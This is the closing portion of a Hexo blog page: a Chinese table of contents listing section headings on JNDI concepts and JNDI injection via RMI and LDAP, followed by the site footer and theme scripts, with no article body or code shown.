Interface）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-JNDI%EF%BC%9F"><span class="nav-text">什么是 JNDI？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-%E7%9A%84%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84"><span class="nav-text">JNDI 的体系架构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%EF%BC%88API%EF%BC%89"><span class="nav-text">应用编程接口（API）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%8F%90%E4%BE%9B%E8%80%85%E6%8E%A5%E5%8F%A3%EF%BC%88SPI%EF%BC%89"><span class="nav-text">服务提供者接口（SPI）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-text">基本用法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E6%9F%A5%E6%89%BE"><span class="nav-text">远程对象查找</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#References-%E6%9C%BA%E5%88%B6"><span class="nav-text">References 机制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI-References-%E6%B3%A8%E5%85%A5"><span class="nav-text">JNDI References 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-RMI"><span class="nav-text">JNDI-RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%888u121%E3%80%817u131%E3%80%816u141-%E5%89%8D%EF%BC%89"><span class="nav-text">远程类加载（8u121、7u131、6u141 前）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E6%97%A0%E9%99%90%E5%88%B6%EF%BC%89"><span class="nav-text">反序列化（无限制）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-LDAP"><span class="nav-text">JNDI-LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%8811-0-1%E3%80%818u191%E3%80%817u201%E3%80%816u211-%E5%89%8D%EF%BC%89"><span class="nav-text">远程类加载（11.0.1、8u191、7u201、6u211 前）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8817-0-13%E3%80%8111-0-25%E3%80%818u461-%E5%89%8D%EF%BC%89"><span class="nav-text">反序列化（17.0.13、11.0.25、8u461 前）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="nav-text">本地类利用</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1212.2k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>